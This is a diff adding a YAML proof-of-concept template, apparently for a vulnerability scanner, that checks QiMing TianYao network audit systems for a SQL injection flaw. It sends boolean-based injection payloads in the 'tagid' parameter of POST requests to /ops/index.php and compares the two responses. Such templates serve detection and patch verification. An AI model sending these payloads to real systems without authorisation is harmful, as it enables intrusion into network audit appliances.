@@ -1,0 +1,27 @@
+id: poc-yaml-qiming-tainyao-network-audit-system-sql-injection
+info:
+  name: QiMing TainYao Network Audit System SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: QiMing TainYao
+  osprey-id: vb_2022_0092
+requests:
+- method: POST
+  path: /ops/index.php?c=Reportguide&a=checkrn&a=checkrn
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=utf-8
+  data: checkname=1237&tagid=123217093745%20or%208722=8723%20--%20
+  expression: 'contains(body, "\"msg\":\"\",\"code\":16")
+
+    '
+- method: POST
+  path: /ops/index.php?c=Reportguide&a=checkrn&a=checkrn
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=utf-8
+  data: checkname=1237&tagid=123217093745%20or%208722=8722%20--%20
+  expression: 'contains(body, "\"code\":13,\"status\":0}")
+
+    '
+variables: {}
+transport: http
